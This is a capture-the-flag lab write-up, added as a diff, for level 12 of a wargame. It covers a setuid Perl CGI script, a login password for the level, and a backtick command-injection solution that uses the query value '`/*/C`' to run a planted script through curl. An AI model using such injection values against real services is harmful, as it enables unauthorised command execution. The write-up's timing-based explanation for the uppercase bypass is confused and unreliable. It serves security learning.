@@ -1,0 +1,67 @@
+# 12
+
+Login
+
+```b
+> ssh level12@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: fa6v5ateaw21peobuub8ipe6s
+```
+
+Tryout
+- We have a Perl script 👉 possible `backtick injection` in query string
+
+```b
+> ls -l level12.pl 
+-rwsr-sr-x+ 1 flag12 level12 464 level12.pl
+```
+```b
+> cat level12.pl 
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1];
+  $xx = $_[0];         🟡 receives query string, the 1st part thereof
+  $xx =~ tr/a-z/A-Z/;  🟡 `tr` all lowercase alpha to caps
+  $xx =~ s/\s.*//;     🟡 `sub` all whitespaces w/ nothing 
+
+  🔵 Vulnerability - Backtick Injection
+
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+```
+
+Solution
+- Create a file: ``` `/*/C` ``` which contains a getflag command
+- The setuid `.pl` script executes a backticks-enclosed expression 
+- Why still fake an ALLCAPS filename?
+  - bc. the program runs fast
+  - `tr` and `=~` pattern matching run at almost simultaneously
+  - to avoid asynchronicit , we ___delay___ the script a little 
+
+```b
+> echo "getflag > /tmp/tmp" > /tmp/C 
+> chmod 777 /tmp/C
+> curl 'http://10.0.2.15:4646?x=`/*/C`'
+```
+
+there you have it in tmp tmp
